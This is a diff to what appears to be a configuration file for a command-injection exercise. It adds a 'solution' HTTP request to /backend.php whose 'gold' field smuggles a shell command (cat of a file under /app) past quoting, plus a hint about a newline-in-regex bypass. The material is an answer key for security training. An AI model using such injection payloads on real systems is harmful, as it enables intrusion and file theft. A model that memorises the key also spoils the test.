@@ -24,6 +24,22 @@ base_request: |-
     "artifacts": "30"
   }
 
+solution: |-
+  POST /backend.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/json
+  Content-Length: 114
+
+  {
+    "hoardType": "artifact",
+    "gold":
+  "10';cat /app/valuate-hoard; echo '",
+    "gems": "20",
+    "artifacts": "30"
+  }
+
+solution_note: Newline in regex
+
 rules:
 
 # Newlines
